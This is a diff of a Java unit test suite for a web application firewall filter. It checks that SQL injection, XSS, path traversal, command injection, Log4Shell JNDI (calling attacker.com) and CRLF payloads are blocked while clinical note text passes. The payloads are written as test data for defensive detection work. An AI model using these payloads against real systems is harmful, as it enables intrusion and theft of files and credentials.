@@ -132,7 +132,7 @@ class WafFilterUnitTest {
 
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 UNION SELECT * FROM users");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});
 
             disabledFilter.doFilter(request, response, chain);
 
@@ -149,7 +149,7 @@ class WafFilterUnitTest {
 
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 UNION SELECT * FROM users");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});
 
             detectFilter.doFilter(request, response, chain);
 
@@ -172,7 +172,7 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenUnionSelect() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 UNION SELECT * FROM users");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});
 
             filter.doFilter(request, response, chain);
 
@@ -185,7 +185,21 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenTautologyWithComment() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("user")));
-            when(request.getParameter("user")).thenReturn("' OR '1'='1' --");
+            when(request.getParameterValues("user")).thenReturn(new String[]{"' OR '1'='1' --"});
+
+            filter.doFilter(request, response, chain);
+
+            verify(response).sendError(anyInt(), anyString());
+            verify(chain, never()).doFilter(request, response);
+        }
+
+        @Test
+        @DisplayName("should detect SQLi when string tautology without comment is present")
+        void shouldDetectSqli_whenStringTautologyNoComment() throws Exception {
+            // Classic string tautology: ' OR 'x'='x — no trailing comment, bypassed old numeric-only pattern
+            when(request.getParameterNames()).thenReturn(
+                    Collections.enumeration(java.util.List.of("user")));
+            when(request.getParameterValues("user")).thenReturn(new String[]{"admin' OR 'x'='x"});
 
             filter.doFilter(request, response, chain);
 
@@ -198,7 +212,7 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenStackedDropTable() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1; DROP TABLE users");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1; DROP TABLE users"});
 
             filter.doFilter(request, response, chain);
 
@@ -211,7 +225,7 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenTimeBased() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 AND SLEEP(5)");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 AND SLEEP(5)"});
 
             filter.doFilter(request, response, chain);
 
@@ -224,7 +238,7 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenIntoOutfile() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 INTO OUTFILE '/tmp/x'");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 INTO OUTFILE '/tmp/x'"});
 
             filter.doFilter(request, response, chain);
 
@@ -237,7 +251,7 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenLoadFile() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("id=LOAD_FILE('/etc/passwd')");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"id=LOAD_FILE('/etc/passwd')"});
 
             filter.doFilter(request, response, chain);
 
@@ -250,8 +264,8 @@ class WafFilterUnitTest {
         void shouldDetectSqli_whenInformationSchema() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn(
-                    "1 AND (SELECT * FROM information_schema.tables)");
+            when(request.getParameterValues("id")).thenReturn(
+                    new String[]{"1 AND (SELECT * FROM information_schema.tables)"});
 
             filter.doFilter(request, response, chain);
 
@@ -264,8 +278,8 @@ class WafFilterUnitTest {
         void shouldAllowCleanSql_whenMedicalTerminology() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("note")));
-            when(request.getParameter("note")).thenReturn(
-                    "SELECT-ive serotonin reuptake inhibitor");
+            when(request.getParameterValues("note")).thenReturn(
+                    new String[]{"SELECT-ive serotonin reuptake inhibitor"});
 
             filter.doFilter(request, response, chain);
 
@@ -278,7 +292,8 @@ class WafFilterUnitTest {
         void shouldAllowCleanSql_whenOrInClinicalContext() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("note")));
-            when(request.getParameter("note")).thenReturn("patient OR family history");
+            when(request.getParameterValues("note")).thenReturn(
+                    new String[]{"patient OR family history"});
 
             filter.doFilter(request, response, chain);
 
@@ -300,7 +315,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenScriptTag() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("input")));
-            when(request.getParameter("input")).thenReturn("<script>alert(1)</script>");
+            when(request.getParameterValues("input")).thenReturn(new String[]{"<script>alert(1)</script>"});
 
             filter.doFilter(request, response, chain);
 
@@ -313,7 +328,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenEventHandler() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("input")));
-            when(request.getParameter("input")).thenReturn("<img onerror=\"alert(1)\">");
+            when(request.getParameterValues("input")).thenReturn(new String[]{"<img onerror=\"alert(1)\">"});
 
             filter.doFilter(request, response, chain);
 
@@ -326,7 +341,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenJavascriptUri() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("redirect")));
-            when(request.getParameter("redirect")).thenReturn("javascript:alert(1)");
+            when(request.getParameterValues("redirect")).thenReturn(new String[]{"javascript:alert(1)"});
 
             filter.doFilter(request, response, chain);
 
@@ -339,7 +354,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenSvgOnload() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("content")));
-            when(request.getParameter("content")).thenReturn("<svg onload=\"alert(1)\">");
+            when(request.getParameterValues("content")).thenReturn(new String[]{"<svg onload=\"alert(1)\">"});
 
             filter.doFilter(request, response, chain);
 
@@ -352,7 +367,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenIframeTag() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("content")));
-            when(request.getParameter("content")).thenReturn("<iframe src=\"evil.com\">");
+            when(request.getParameterValues("content")).thenReturn(new String[]{"<iframe src=\"evil.com\">"});
 
             filter.doFilter(request, response, chain);
 
@@ -365,7 +380,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenDataUri() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("url")));
-            when(request.getParameter("url")).thenReturn("data:text/html,<h1>XSS</h1>");
+            when(request.getParameterValues("url")).thenReturn(new String[]{"data:text/html,<h1>XSS</h1>"});
 
             filter.doFilter(request, response, chain);
 
@@ -378,7 +393,7 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenEval() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("code")));
-            when(request.getParameter("code")).thenReturn("eval(atob('YWxlcnQoMSk='))");
+            when(request.getParameterValues("code")).thenReturn(new String[]{"eval(atob('YWxlcnQoMSk='))"});
 
             filter.doFilter(request, response, chain);
 
@@ -391,7 +406,36 @@ class WafFilterUnitTest {
         void shouldDetectXss_whenVbscriptUri() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("link")));
-            when(request.getParameter("link")).thenReturn("vbscript:msgbox(1)");
+            when(request.getParameterValues("link")).thenReturn(new String[]{"vbscript:msgbox(1)"});
+
+            filter.doFilter(request, response, chain);
+
+            verify(response).sendError(anyInt(), anyString());
+            verify(chain, never()).doFilter(request, response);
+        }
+
+        @Test
+        @DisplayName("should allow medical onset= terminology without triggering XSS event handler rule")
+        void shouldAllow_whenMedicalOnsetTerm() throws Exception {
+            // 'onset=' starts with 'on' and has '=' — old broad pattern matched it; narrowed pattern does not
+            when(request.getParameterNames()).thenReturn(
+                    Collections.enumeration(java.util.List.of("note")));
+            when(request.getParameterValues("note")).thenReturn(new String[]{"onset=3 days, ongoing=yes"});
+
+            filter.doFilter(request, response, chain);
+
+            verify(chain).doFilter(request, response);
+            verify(response, never()).sendError(anyInt(), anyString());
+        }
+
+        @Test
+        @DisplayName("should detect XSS when second param value contains script and first is clean")
+        void shouldDetectXss_whenSecondMultiValueContainsScript() throws Exception {
+            // Verifies that all values for a repeated parameter are inspected (fix for getParameter bypass)
+            when(request.getParameterNames()).thenReturn(
+                    Collections.enumeration(java.util.List.of("input")));
+            when(request.getParameterValues("input")).thenReturn(
+                    new String[]{"safe value", "<script>alert(1)</script>"});
 
             filter.doFilter(request, response, chain);
 
@@ -413,7 +457,7 @@ class WafFilterUnitTest {
         void shouldDetectPathTraversal_whenDotDotSlash() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("file")));
-            when(request.getParameter("file")).thenReturn("../../etc/passwd");
+            when(request.getParameterValues("file")).thenReturn(new String[]{"../../etc/passwd"});
 
             filter.doFilter(request, response, chain);
 
@@ -426,7 +470,7 @@ class WafFilterUnitTest {
         void shouldDetectPathTraversal_whenEtcPasswd() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("file")));
-            when(request.getParameter("file")).thenReturn("/etc/passwd");
+            when(request.getParameterValues("file")).thenReturn(new String[]{"/etc/passwd"});
 
             filter.doFilter(request, response, chain);
 
@@ -439,7 +483,7 @@ class WafFilterUnitTest {
         void shouldDetectPathTraversal_whenUrlEncoded() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("file")));
-            when(request.getParameter("file")).thenReturn("%2e%2e%2fetc%2fpasswd");
+            when(request.getParameterValues("file")).thenReturn(new String[]{"%2e%2e%2fetc%2fpasswd"});
 
             filter.doFilter(request, response, chain);
 
@@ -453,7 +497,7 @@ class WafFilterUnitTest {
             // WafFilter.decode() will decode %252e%252e%252f → %2e%2e%2f → ../
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("file")));
-            when(request.getParameter("file")).thenReturn("%252e%252e%252fetc%252fpasswd");
+            when(request.getParameterValues("file")).thenReturn(new String[]{"%252e%252e%252fetc%252fpasswd"});
 
             filter.doFilter(request, response, chain);
 
@@ -466,7 +510,7 @@ class WafFilterUnitTest {
         void shouldDetectPathTraversal_whenProcSelf() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("path")));
-            when(request.getParameter("path")).thenReturn("/proc/self/environ");
+            when(request.getParameterValues("path")).thenReturn(new String[]{"/proc/self/environ"});
 
             filter.doFilter(request, response, chain);
 
@@ -479,7 +523,7 @@ class WafFilterUnitTest {
         void shouldDetectPathTraversal_whenWindowsSystem32() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("path")));
-            when(request.getParameter("path")).thenReturn("C:\\windows\\system32\\cmd.exe");
+            when(request.getParameterValues("path")).thenReturn(new String[]{"C:\\windows\\system32\\cmd.exe"});
 
             filter.doFilter(request, response, chain);
 
@@ -501,7 +545,7 @@ class WafFilterUnitTest {
         void shouldDetectCmdInjection_whenShellMetacharCommand() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("name")));
-            when(request.getParameter("name")).thenReturn("valid; whoami");
+            when(request.getParameterValues("name")).thenReturn(new String[]{"valid; whoami"});
 
             filter.doFilter(request, response, chain);
 
@@ -514,7 +558,7 @@ class WafFilterUnitTest {
         void shouldDetectCmdInjection_whenSubshell() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("cmd")));
-            when(request.getParameter("cmd")).thenReturn("$(id)");
+            when(request.getParameterValues("cmd")).thenReturn(new String[]{"$(id)"});
 
             filter.doFilter(request, response, chain);
 
@@ -527,7 +571,7 @@ class WafFilterUnitTest {
         void shouldDetectCmdInjection_whenJndiLog4Shell() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("ua")));
-            when(request.getParameter("ua")).thenReturn("${jndi:ldap://attacker.com/x}");
+            when(request.getParameterValues("ua")).thenReturn(new String[]{"${jndi:ldap://attacker.com/x}"});
 
             filter.doFilter(request, response, chain);
 
@@ -540,7 +584,7 @@ class WafFilterUnitTest {
         void shouldDetectCmdInjection_whenBacktick() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("input")));
-            when(request.getParameter("input")).thenReturn("`cat /etc/passwd`");
+            when(request.getParameterValues("input")).thenReturn(new String[]{"`cat /etc/passwd`"});
 
             filter.doFilter(request, response, chain);
 
@@ -562,7 +606,7 @@ class WafFilterUnitTest {
         void shouldDetectCrlf_whenUrlEncodedCr() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("redirect")));
-            when(request.getParameter("redirect")).thenReturn("/home%0dSet-Cookie: evil=1");
+            when(request.getParameterValues("redirect")).thenReturn(new String[]{"/home%0dSet-Cookie: evil=1"});
 
             filter.doFilter(request, response, chain);
 
@@ -575,7 +619,7 @@ class WafFilterUnitTest {
         void shouldDetectCrlf_whenUrlEncodedLf() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("redirect")));
-            when(request.getParameter("redirect")).thenReturn("/home%0aSet-Cookie: evil=1");
+            when(request.getParameterValues("redirect")).thenReturn(new String[]{"/home%0aSet-Cookie: evil=1"});
 
             filter.doFilter(request, response, chain);
 
@@ -588,7 +632,7 @@ class WafFilterUnitTest {
         void shouldDetectCrlf_whenLiteralCrLf() throws Exception {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("redirect")));
-            when(request.getParameter("redirect")).thenReturn("/home\r\nSet-Cookie: evil=1");
+            when(request.getParameterValues("redirect")).thenReturn(new String[]{"/home\r\nSet-Cookie: evil=1"});
 
             filter.doFilter(request, response, chain);
 
@@ -714,10 +758,12 @@ class WafFilterUnitTest {
     class RequestLimits {
 
         @Test
-        @DisplayName("should block when URI exceeds max length")
+        @DisplayName("should block when URI path + query string exceeds max length")
         void shouldBlock_whenUriTooLong() throws Exception {
-            String longUri = "/carlos/search.do?" + "a".repeat(2100);
-            when(request.getRequestURI()).thenReturn(longUri);
+            // Per Servlet spec, getRequestURI() returns only the path (no query string).
+            // A long query string must also be counted — test verifies the combined check.
+            when(request.getRequestURI()).thenReturn("/carlos/search.do");
+            when(request.getQueryString()).thenReturn("a".repeat(2100));
             when(request.getMethod()).thenReturn("GET");
 
             filter.doFilter(request, response, chain);
@@ -739,7 +785,7 @@ class WafFilterUnitTest {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(params));
             for (String p : params) {
-                when(request.getParameter(p)).thenReturn("value");
+                when(request.getParameterValues(p)).thenReturn(new String[]{"value"});
             }
 
             filter.doFilter(request, response, chain);
@@ -756,7 +802,7 @@ class WafFilterUnitTest {
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(params));
             for (String p : params) {
-                when(request.getParameter(p)).thenReturn("safe");
+                when(request.getParameterValues(p)).thenReturn(new String[]{"safe"});
             }
 
             filter.doFilter(request, response, chain);
@@ -809,8 +855,8 @@ class WafFilterUnitTest {
             // Clinical note with content that would trigger SQLi on a hardened path
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("note")));
-            when(request.getParameter("note")).thenReturn(
-                    "UNION of provider services; SELECT relevant medications from list");
+            when(request.getParameterValues("note")).thenReturn(
+                    new String[]{"UNION of provider services; SELECT relevant medications from list"});
 
             filter.doFilter(request, response, chain);
 
@@ -828,11 +874,25 @@ class WafFilterUnitTest {
             when(request.getQueryString()).thenReturn("id=1 UNION SELECT * FROM users");
             when(request.getParameterNames()).thenReturn(
                     Collections.enumeration(java.util.List.of("id")));
-            when(request.getParameter("id")).thenReturn("1 UNION SELECT * FROM users");
+            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});
 
             filter.doFilter(request, response, chain);
 
             // Relaxed path: query string IS still checked
+            verify(response).sendError(anyInt(), anyString());
+            verify(chain, never()).doFilter(request, response);
+        }
+
+        @Test
+        @DisplayName("should block TRACE to allowlisted path — protocol enforcement runs before allowlist")
+        void shouldBlockTrace_evenForAllowlistedPath() throws Exception {
+            // Verifies that TRACE/TRACK method check runs before the allowlist early return,
+            // so TRACE to /images/ (which reflects request headers) is still blocked.
+            when(request.getRequestURI()).thenReturn("/carlos/images/logo.png");
+            when(request.getMethod()).thenReturn("TRACE");
+
+            filter.doFilter(request, response, chain);
+
             verify(response).sendError(anyInt(), anyString());
             verify(chain, never()).doFilter(request, response);
         }
